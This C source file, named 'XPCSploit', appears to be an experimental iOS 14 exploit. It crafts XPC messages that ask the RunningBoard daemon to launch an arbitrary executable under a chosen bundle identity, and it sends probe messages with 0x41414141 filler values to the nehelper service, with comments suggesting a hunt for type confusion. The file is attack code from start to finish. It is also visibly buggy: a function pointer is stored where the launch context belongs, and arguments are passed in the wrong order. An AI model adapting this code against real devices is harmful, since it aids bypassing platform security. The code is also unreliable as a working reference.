#include "XPCSploit.h"

#include <stdio.h>
#include <stdlib.h>
#include <xpc/xpc.h>
#include <CoreFoundation/CoreFoundation.h>

enum NEHelperCacheCommand {
	kNERedirectCommand = 1,
	kNESetRoutesCommand = 2
};


static void
connection_handler(xpc_connection_t peer)
{
	xpc_connection_set_event_handler(peer, ^(xpc_object_t event) {
		printf("Message received: %p\n", event);
	});
	xpc_connection_resume(peer);
}


xpc_object_t RBSProcessIdentity(const char* bundleId, const char* jobLabel)
{
	xpc_object_t _RBSProcessIdentity = xpc_dictionary_create(NULL, NULL, 0);
	xpc_dictionary_set_string(_RBSProcessIdentity ,"_bundleIdentifier", bundleId);
	xpc_dictionary_set_uint64(_RBSProcessIdentity, "_platform", 2); // 1 = macOS, 2 = iOS 
	xpc_dictionary_set_string(_RBSProcessIdentity, "_daemonJobLabel", jobLabel);
	xpc_dictionary_set_string(_RBSProcessIdentity, "bsx_class", "RBSProcessIdentity"); // Class to represent
	return _RBSProcessIdentity;
}


xpc_object_t RBSLaunchContext(const char* executablePath, xpc_object_t identity, 
	const char* explanation, const char* exePath, 
	const char* stdoutPath, const char* stderrPath,
	const char** environment)
{

	xpc_object_t _RBSLaunchContext = xpc_dictionary_create(NULL, NULL, 0);

	if(environment == NULL) { // TODO implement custom environment
		
		// Create environment object
		xpc_object_t envXPC = xpc_dictionary_create(NULL,NULL,0);
		xpc_dictionary_set_string(envXPC, "PATH", "/usr/bin:/usr/sbin:/sbin");
		xpc_dictionary_set_value(_RBSLaunchContext, "__additionalEnvironment", envXPC); // Add it to the launch context
	}
	
	xpc_dictionary_set_value(_RBSLaunchContext, "_identity", identity);
    xpc_dictionary_set_uint64(_RBSLaunchContext, "_executionOptions", 8);
    xpc_dictionary_set_string(_RBSLaunchContext, "_standardOutputPath",  stdoutPath);
    xpc_dictionary_set_string(_RBSLaunchContext, "_standardErrorPath", stderrPath);
    xpc_dictionary_set_string(_RBSLaunchContext, "_explanation", explanation);
    xpc_dictionary_set_uint64(_RBSLaunchContext ,"_lsSpawnFlags", 0); // 0 = Foreground, 1 = background
    xpc_dictionary_set_uint64(_RBSLaunchContext ,"_executionOptions", 0x8);
    xpc_dictionary_set_uint64(_RBSLaunchContext, "_initialRole", 0x7);
	xpc_dictionary_set_string(_RBSLaunchContext, "bsx_class", "RBSLaunchContext"); //  XPC whitelisted class to represent
    return _RBSLaunchContext;
}


xpc_object_t RBSLaunchRequest(xpc_object_t context)
{
	xpc_object_t _RBSLaunchRequest = xpc_dictionary_create(NULL, NULL, 0);
	xpc_dictionary_set_string(_RBSLaunchRequest, "bsx_class", "RBSLaunchRequest"); // XPC whitelisted class to represent
	xpc_dictionary_set_value(_RBSLaunchRequest, "_context", RBSLaunchContext);
	return _RBSLaunchRequest;
}

xpc_object_t RBSConnection(xpc_object_t launchRequest, xpc_object_t identity) 
{
	xpc_object_t _RBSConnection = xpc_dictionary_create(NULL, NULL, 0);
	xpc_dictionary_set_string(_RBSConnection, "rbs_selector", "executeLaunchRequest:identifier:error:"); // XPC whitelisted selector to perform
	xpc_dictionary_set_value(_RBSConnection, "array_level_0", launchRequest); // First argument for the selector
	xpc_dictionary_set_value(_RBSConnection, "array_level_1", identity); // Second argument for the selector
	xpc_dictionary_set_string(_RBSConnection, "bsx_class", "RBSConnection"); // XPC whitelisted class to represent
	return _RBSConnection;
}

bool xpc_connect_and_sendmsg(const char* service, xpc_object_t msg)
{
	xpc_connection_t conn = NULL;

	// Create XPC connection
	conn =xpc_connection_create_mach_service(service, NULL, 0); 
	if (conn == NULL) {
	    perror("xpc_connection_create_mach_service");
	    return false;
	}


	// Send and wait for the message response
	xpc_connection_send_message(conn, msg);
	xpc_connection_set_event_handler(conn, ^(xpc_object_t resp){
	        printf("Received message: %p\n", resp);
	        printf("%s\n", xpc_copy_description(resp));
	});

	// Resume xpc connection
	xpc_connection_resume(conn);

	// Send additional messages (TODO: properly implement)
	xpc_connection_send_message_with_reply(conn, msg, NULL, ^(xpc_object_t resp) {
	        printf("Received second message: %p\n", resp);
	        printf("%s\n", xpc_copy_description(resp));
	});

	xpc_connection_send_message_with_reply(conn, msg, NULL, ^(xpc_object_t resp) {
	        printf("Received third message: %p\n", resp);
	        printf("%s\n", xpc_copy_description(resp));
	});
	dispatch_main();
	return true;

}

bool NEHelperLauncher(const char *exePath, const char* bundleId)
{
//	xpc_object_t initMsg = xpc_dictionary_create(NULL, NULL, 0);
//	xpc_connect_and_sendmsg("com.apple.nehelper", initMsg);
///	printf("%s\n", "Sent init message\n");
	
	xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
//	xpc_dictionary_set_bool(msg, "init-command", true);
	xpc_dictionary_set_uint64(msg, "interface-command", 1);
	xpc_dictionary_set_uint64(msg, "interface-address", 0x41414141);
	xpc_dictionary_set_uint64(msg, "interface-lifetime", 0x41414141);
//	xpc_dictionary_set_uint64(msg, "cache-command", 3);
//	xpc_dictionary_set_uint64(msg, "cache-executable-path", 0x41414141); // Type confusion?
//	xpc_dictionary_set_uint64(msg, "cache-signing-identifier", 0x41414141);//bundleId);
	xpc_dictionary_set_uint64(msg, "delegate-class-id", 10);

	xpc_connection_t conn = NULL;

	// Create XPC connection
	conn =xpc_connection_create_mach_service("com.apple.nehelper", NULL, 0); 
	if (conn == NULL) {
	    perror("xpc_connection_create_mach_service");
	    return false;
	}


	// Send and wait for the message response
	xpc_connection_send_message(conn, msg);
	xpc_connection_set_event_handler(conn, ^(xpc_object_t resp){
	        printf("Received message: %p\n", resp);
	        printf("%s\n", xpc_copy_description(resp));
	});

	// Resume xpc connection
	xpc_connection_resume(conn);

	// Send additional messages (TODO: properly implement)
	xpc_connection_send_message_with_reply(conn, msg, NULL, ^(xpc_object_t resp) {
	        printf("Received second message: %p\n", resp);
	        printf("%s\n", xpc_copy_description(resp));
	});

	xpc_connection_send_message_with_reply(conn, msg, NULL, ^(xpc_object_t resp) {
	        printf("Received third message: %p\n", resp);
	        printf("%s\n", xpc_copy_description(resp));
	});
	dispatch_main();

	return true;
}

bool RunningBoardLauncher(const char* exePath, const char* bundleId, 
	const char* jobLabel, const char* stdoutPath, 
	const char*stderrPath, const char** environ, const char* reason) 
{

        xpc_object_t identity = RBSProcessIdentity(bundleId, jobLabel);
        xpc_object_t context = RBSLaunchContext(exePath, identity, "iOS 14 XPC exploit", stdoutPath, stderrPath, reason, NULL); // For now don't allow custom environment
        xpc_object_t launchRequest = RBSLaunchRequest(context);
        xpc_object_t rbsConnMsg = RBSConnection(launchRequest, identity); // Finally create the XPC message 
        return xpc_connect_and_sendmsg("com.apple.runningboard", rbsConnMsg);
}
